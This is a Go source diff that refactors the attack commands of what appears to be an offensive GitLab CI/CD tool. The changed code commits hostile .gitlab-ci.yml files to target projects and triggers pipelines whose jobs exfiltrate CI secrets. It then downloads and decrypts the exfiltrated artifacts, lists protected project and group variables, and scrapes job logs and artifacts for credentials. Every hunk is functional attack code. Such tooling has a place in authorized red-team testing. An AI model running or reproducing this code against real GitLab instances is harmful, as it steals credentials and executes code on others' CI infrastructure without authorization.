@@ -5,6 +5,7 @@ import (
 	"encoding/json"
 	"errors"
 	"fmt"
+	"io"
 	"os"
 	"strings"
 	"time"
@@ -16,9 +17,102 @@ import (
 	"github.com/spf13/cobra"
 )
 
-// runAttackSecrets runs the secrets exfiltration attack mode.
+func readOptionalKeyFile(path, flagName string) ([]byte, error) {
+	p := strings.TrimSpace(path)
+	if p == "" {
+		return nil, nil
+	}
+	b, err := os.ReadFile(p)
+	if err != nil {
+		return nil, fmt.Errorf("read --%s: %w", flagName, err)
+	}
+	return b, nil
+}
+
+type artifactExfilResult struct {
+	secrets    map[string]string
+	pipelineID int64
+	jobID      int64
+	status     string
+	url        string
+}
+
+func waitArtifactExfil(ctx context.Context, w io.Writer, client *gitlabx.Client, target, branch, jobName, baseURL string, privkeyPEM []byte) artifactExfilResult {
+	var res artifactExfilResult
+	renderInfo(w, fmt.Sprintf("waiting for exfiltrate job (timeout: %s)...", atkWaitTimeout))
+	res.pipelineID, res.jobID, res.status, _ = attack.WaitForExfilPipeline(ctx, client, target, branch, jobName, 5*time.Second, atkWaitTimeout)
+	if res.pipelineID > 0 {
+		res.url = fmt.Sprintf("%s/%s/-/pipelines/%d", strings.TrimSuffix(baseURL, "/"), target, res.pipelineID)
+	}
+	switch res.status {
+	case "success":
+		res.secrets = downloadAndDecryptArtifacts(ctx, w, client, target, res.jobID, privkeyPEM)
+	case "":
+		renderWarning(w, "exfiltrate job not found or timed out")
+	default:
+		renderWarning(w, fmt.Sprintf("exfiltrate job status: %s", res.status))
+	}
+	return res
+}
+
+func downloadAndDecryptArtifacts(ctx context.Context, w io.Writer, client *gitlabx.Client, target string, jobID int64, privkeyPEM []byte) map[string]string {
+	zipBytes, zerr := secdump.DownloadJobArtifactsZIP(ctx, client, target, jobID)
+	if zerr != nil {
+		renderWarning(w, fmt.Sprintf("artifact download failed: %v", zerr))
+		return nil
+	}
+	sJSON, sEnc, aEnc, _ := secdump.ExtractExfilFiles(zipBytes)
+	if len(privkeyPEM) > 0 && len(sEnc) > 0 && len(aEnc) > 0 {
+		secrets, err := secdump.DecryptExfilArtifacts(privkeyPEM, sEnc, aEnc)
+		if err != nil {
+			renderWarning(w, fmt.Sprintf("decrypt failed: %v", err))
+			return nil
+		}
+		return secrets
+	}
+	if len(sJSON) > 0 {
+		var secrets map[string]string
+		_ = json.Unmarshal(sJSON, &secrets)
+		return secrets
+	}
+	return nil
+}
+
+func collectSecretsDumpData(ctx context.Context, client *gitlabx.Client, target string, out *secretsOutput) error {
+	if atkWithProjVars {
+		pv, err := secdump.ListProjectVariables(ctx, client, target, atkIncludeProtected)
+		if err != nil {
+			return fmt.Errorf("list project variables: %w", err)
+		}
+		out.ProjectVariables = pv
+	}
+	if atkWithGroupVars {
+		gid := strings.TrimSpace(atkGroupID)
+		if gid == "" {
+			return fmt.Errorf("--group-vars requires --group-id (group numeric ID or full path)")
+		}
+		gv, err := secdump.ListGroupVariables(ctx, client, gid, atkIncludeProtected)
+		if err != nil {
+			return fmt.Errorf("list group variables: %w", err)
+		}
+		out.GroupVariables = gv
+	}
+	if atkLogs {
+		finds, _ := secdump.ScrapeJobLogs(ctx, client, target, strings.TrimSpace(atkLogsRef), atkLogsMaxPipelines, atkLogsMaxJobs)
+		if len(finds) > 0 {
+			out.LogFindings = finds
+		}
+	}
+	if atkArtifacts {
+		afinds, _ := secdump.ScrapeArtifacts(ctx, client, target, strings.TrimSpace(atkArtifactsRef), atkArtifactsMaxPipelines, atkArtifactsMaxJobs, atkArtifactsMaxZipBytes, atkArtifactsMaxFileBytes)
+		if len(afinds) > 0 {
+			out.ArtifactFindings = afinds
+		}
+	}
+	return nil
+}
+
 func runAttackSecrets(ctx context.Context, cmd *cobra.Command, client *gitlabx.Client) error {
-	// parse tags
 	var tags []string
 	if strings.TrimSpace(atkTags) != "" {
 		for t := range strings.SplitSeq(atkTags, ",") {
@@ -28,32 +122,22 @@ func runAttackSecrets(ctx context.Context, cmd *cobra.Command, client *gitlabx.C
 			}
 		}
 	}
-	var pubkey string
-	if strings.TrimSpace(atkPubkeyFile) != "" {
-		b, err := os.ReadFile(strings.TrimSpace(atkPubkeyFile))
-		if err != nil {
-			return fmt.Errorf("read --pubkey-file: %w", err)
-		}
-		pubkey = string(b)
-	}
-	var privkeyPEM []byte
-	if strings.TrimSpace(atkPrivkeyFile) != "" {
-		b, err := os.ReadFile(strings.TrimSpace(atkPrivkeyFile))
-		if err != nil {
-			return fmt.Errorf("read --privkey-file: %w", err)
-		}
-		privkeyPEM = b
-	}
-	sr := newSecretsRunner(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
-	exfil := attack.ExfilOptions{Method: atkExfilMethod, Target: atkExfilTarget}
-	url, exfilJobNameUsed, err := sr.RunExfil(ctx, atkTarget, atkBranch, pubkey, tags, exfil)
+	pubkeyBytes, err := readOptionalKeyFile(atkPubkeyFile, "pubkey-file")
 	if err != nil {
 		return err
 	}
-	// Give GitLab a moment to process the commit before querying pipelines.
+	privkeyPEM, err := readOptionalKeyFile(atkPrivkeyFile, "privkey-file")
+	if err != nil {
+		return err
+	}
+	sr := newSecretsRunner(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
+	exfil := attack.ExfilOptions{Method: atkExfilMethod, Target: atkExfilTarget}
+	url, exfilJobNameUsed, err := sr.RunExfil(ctx, atkTarget, atkBranch, string(pubkeyBytes), tags, exfil)
+	if err != nil {
+		return err
+	}
 	fmt.Fprintf(cmd.ErrOrStderr(), "[attack] pipeline: %s\n", url)
 
-	// Wait for the exfiltrate job, download artifacts, and decrypt -- default for artifact method.
 	var (
 		exfilSecrets map[string]string
 		exfilJobID   int64
@@ -62,78 +146,29 @@ func runAttackSecrets(ctx context.Context, cmd *cobra.Command, client *gitlabx.C
 	)
 	exfilMethod := strings.ToLower(strings.TrimSpace(atkExfilMethod))
 	if !atkNoWait && (exfilMethod == "" || exfilMethod == "artifact") {
-		// In JSON mode write progress to stderr so stdout stays clean JSON.
 		progressW := cmd.OutOrStdout()
 		if outputJSON {
 			progressW = cmd.ErrOrStderr()
 		}
-		stdout := progressW
-		renderInfo(stdout, fmt.Sprintf("waiting for exfiltrate job (timeout: %s)...", atkWaitTimeout))
-		// WaitForExfilPipeline scans the 5 most recent pipelines on the branch each tick,
-		// so it correctly finds the exfil pipeline even when the branch-creation pipeline
-		// (triggered by EnsureBranch) appears first and contains no "exfiltrate" job.
-		pipelineID, exfilJobID, exfilStatus, _ = attack.WaitForExfilPipeline(ctx, client, atkTarget, atkBranch, exfilJobNameUsed, 5*time.Second, atkWaitTimeout)
-		if pipelineID > 0 {
-			url = fmt.Sprintf("%s/%s/-/pipelines/%d", strings.TrimSuffix(gitlabURL, "/"), atkTarget, pipelineID)
-		}
-		switch exfilStatus {
-		case "success":
-			zipBytes, zerr := secdump.DownloadJobArtifactsZIP(ctx, client, atkTarget, exfilJobID)
-			if zerr != nil {
-				renderWarning(stdout, fmt.Sprintf("artifact download failed: %v", zerr))
-			} else {
-				sJSON, sEnc, aEnc, _ := secdump.ExtractExfilFiles(zipBytes)
-				if len(privkeyPEM) > 0 && len(sEnc) > 0 && len(aEnc) > 0 {
-					exfilSecrets, err = secdump.DecryptExfilArtifacts(privkeyPEM, sEnc, aEnc)
-					if err != nil {
-						renderWarning(stdout, fmt.Sprintf("decrypt failed: %v", err))
-					}
-				} else if len(sJSON) > 0 {
-					_ = json.Unmarshal(sJSON, &exfilSecrets)
-				}
-			}
-		case "":
-			renderWarning(stdout, "exfiltrate job not found or timed out")
-		default:
-			renderWarning(stdout, fmt.Sprintf("exfiltrate job status: %s", exfilStatus))
+		baseURL := strings.TrimSpace(gitlabURL)
+		res := waitArtifactExfil(ctx, progressW, client, atkTarget, atkBranch, exfilJobNameUsed, baseURL, privkeyPEM)
+		exfilSecrets = res.secrets
+		exfilJobID = res.jobID
+		exfilStatus = res.status
+		pipelineID = res.pipelineID
+		if res.url != "" {
+			url = res.url
 		}
 		if len(exfilSecrets) > 0 {
-			renderExfilSecrets(stdout, exfilSecrets, atkAllVars)
-			persistAttackExfil(strings.TrimSpace(gitlabURL), atkTarget, 0, "", atkBranch, url, pipelineID, exfilJobID, exfilSecrets)
+			renderExfilSecrets(progressW, exfilSecrets, atkAllVars)
+			persistAttackExfil(baseURL, atkTarget, 0, "", atkBranch, url, pipelineID, exfilJobID, exfilSecrets)
 		}
 	}
 
 	if outputJSON {
 		out := secretsOutput{PipelineURL: url, JobID: exfilJobID, JobStatus: exfilStatus, ExfilSecrets: exfilSecrets}
-		if atkWithProjVars {
-			pv, err := secdump.ListProjectVariables(ctx, client, atkTarget, atkIncludeProtected)
-			if err != nil {
-				return fmt.Errorf("list project variables: %w", err)
-			}
-			out.ProjectVariables = pv
-		}
-		if atkWithGroupVars {
-			gid := strings.TrimSpace(atkGroupID)
-			if gid == "" {
-				return fmt.Errorf("--group-vars requires --group-id (group numeric ID or full path)")
-			}
-			gv, err := secdump.ListGroupVariables(ctx, client, gid, atkIncludeProtected)
-			if err != nil {
-				return fmt.Errorf("list group variables: %w", err)
-			}
-			out.GroupVariables = gv
-		}
-		if atkLogs {
-			finds, _ := secdump.ScrapeJobLogs(ctx, client, atkTarget, strings.TrimSpace(atkLogsRef), atkLogsMaxPipelines, atkLogsMaxJobs)
-			if len(finds) > 0 {
-				out.LogFindings = finds
-			}
-		}
-		if atkArtifacts {
-			afinds, _ := secdump.ScrapeArtifacts(ctx, client, atkTarget, strings.TrimSpace(atkArtifactsRef), atkArtifactsMaxPipelines, atkArtifactsMaxJobs, atkArtifactsMaxZipBytes, atkArtifactsMaxFileBytes)
-			if len(afinds) > 0 {
-				out.ArtifactFindings = afinds
-			}
+		if err := collectSecretsDumpData(ctx, client, atkTarget, &out); err != nil {
+			return err
 		}
 		b, err := json.MarshalIndent(out, "", "  ")
 		if err != nil {
@@ -146,9 +181,7 @@ func runAttackSecrets(ctx context.Context, cmd *cobra.Command, client *gitlabx.C
 	return nil
 }
 
-// runAttackCommitCI commits a .gitlab-ci.yml to the target repo and triggers a pipeline.
-func runAttackCommitCI(ctx context.Context, cmd *cobra.Command, client *gitlabx.Client) error {
-	// Validate CI content source: allow exactly one of --ci-yaml, --ci-file, --ci-stdin, or --payload
+func countCISources() int {
 	sources := 0
 	if strings.TrimSpace(atkCIInline) != "" {
 		sources++
@@ -162,24 +195,26 @@ func runAttackCommitCI(ctx context.Context, cmd *cobra.Command, client *gitlabx.
 	if strings.TrimSpace(atkPayload) != "" {
 		sources++
 	}
-	if sources != 1 {
-		return fmt.Errorf("provide exactly one CI content source: --ci-yaml, --ci-file, --ci-stdin, or --payload")
-	}
-	// Auto-select runner tags for ror payload if not provided
-	if strings.TrimSpace(atkPayload) != "" {
-		lp := strings.ToLower(strings.TrimSpace(atkPayload))
-		if (lp == payloadRor || lp == payloadRunnerOnRunner || lp == payloadRunnerOnRunnerAlt) && strings.TrimSpace(atkTags) == "" {
-			tags, _, derr := rorpkg.DiscoverProjectRunnerTags(ctx, client, atkTarget)
-			if derr == nil {
-				if strings.TrimSpace(atkExecutor) != "" {
-					tags = rorpkg.FilterTagsByExecutor(tags, atkExecutor)
-				}
-				if len(tags) > 0 {
-					atkTags = strings.Join(tags, ",")
-				}
-			}
+	return sources
+}
+
+func autoDiscoverRorTags(ctx context.Context, client *gitlabx.Client) {
+	lp := strings.ToLower(strings.TrimSpace(atkPayload))
+	if (lp == payloadRor || lp == payloadRunnerOnRunner || lp == payloadRunnerOnRunnerAlt) && strings.TrimSpace(atkTags) == "" {
+		tags, _, derr := rorpkg.DiscoverProjectRunnerTags(ctx, client, atkTarget)
+		if derr != nil {
+			return
+		}
+		if strings.TrimSpace(atkExecutor) != "" {
+			tags = rorpkg.FilterTagsByExecutor(tags, atkExecutor)
+		}
+		if len(tags) > 0 {
+			atkTags = strings.Join(tags, ",")
 		}
 	}
+}
+
+func resolveCIContent() (string, error) {
 	var ci string
 	var err error
 	if strings.TrimSpace(atkPayload) != "" {
@@ -188,27 +223,27 @@ func runAttackCommitCI(ctx context.Context, cmd *cobra.Command, client *gitlabx.
 		ci, err = loadCIContent(atkCIInline, atkCIFile, atkCIStdin)
 	}
 	if err != nil {
-		return err
+		return "", err
 	}
 	if strings.TrimSpace(ci) == "" {
-		return errors.New("empty CI content")
+		return "", errors.New("empty CI content")
 	}
+	return ci, nil
+}
 
-	// Deconflict strategy for branch staging
+func commitCIAndTrackPipeline(ctx context.Context, client *gitlabx.Client, ci string) (url, finalBranch string, pipelineID int64, err error) {
 	if strings.TrimSpace(atkBranch) == "" {
 		atkBranch = attack.GogatozAttacks
 	}
-	finalBranch, err := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
+	finalBranch, err = ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
 	if err != nil {
-		return err
+		return "", "", 0, err
 	}
 	att := newAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
-	url, err := att.CommitCIPipeline(ctx, atkTarget, finalBranch, ci, atkMessage)
+	url, err = att.CommitCIPipeline(ctx, atkTarget, finalBranch, ci, atkMessage)
 	if err != nil {
-		return err
+		return "", "", 0, err
 	}
-	// Snapshot the stale pipeline (from branch creation) so we can
-	// wait for the NEW pipeline triggered by the CI file commit.
 	stalePipelineID, _ := attack.WaitForPipelineForRef(ctx, client, atkTarget, finalBranch, 0, 500*time.Millisecond, 5*time.Second)
 	pipelineID, waitErr := attack.WaitForPipelineForRef(ctx, client, atkTarget, finalBranch, stalePipelineID, 2*time.Second, 30*time.Second)
 	if waitErr == nil && pipelineID > 0 {
@@ -216,9 +251,27 @@ func runAttackCommitCI(ctx context.Context, cmd *cobra.Command, client *gitlabx.
 	} else if stalePipelineID > 0 {
 		url = fmt.Sprintf("%s/%s/-/pipelines/%d", strings.TrimSuffix(gitlabURL, "/"), atkTarget, stalePipelineID)
 	}
+	return url, finalBranch, pipelineID, nil
+}
+
+func runAttackCommitCI(ctx context.Context, cmd *cobra.Command, client *gitlabx.Client) error {
+	if countCISources() != 1 {
+		return fmt.Errorf("provide exactly one CI content source: --ci-yaml, --ci-file, --ci-stdin, or --payload")
+	}
+	if strings.TrimSpace(atkPayload) != "" {
+		autoDiscoverRorTags(ctx, client)
+	}
+	ci, err := resolveCIContent()
+	if err != nil {
+		return err
+	}
+
+	url, finalBranch, pipelineID, err := commitCIAndTrackPipeline(ctx, client, ci)
+	if err != nil {
+		return err
+	}
 	fmt.Fprintf(cmd.ErrOrStderr(), "[attack] pipeline: %s\n", url)
 
-	// Optionally create a merge request after committing CI
 	var mrURL string
 	var mrIID int64
 	if atkCreateMR {
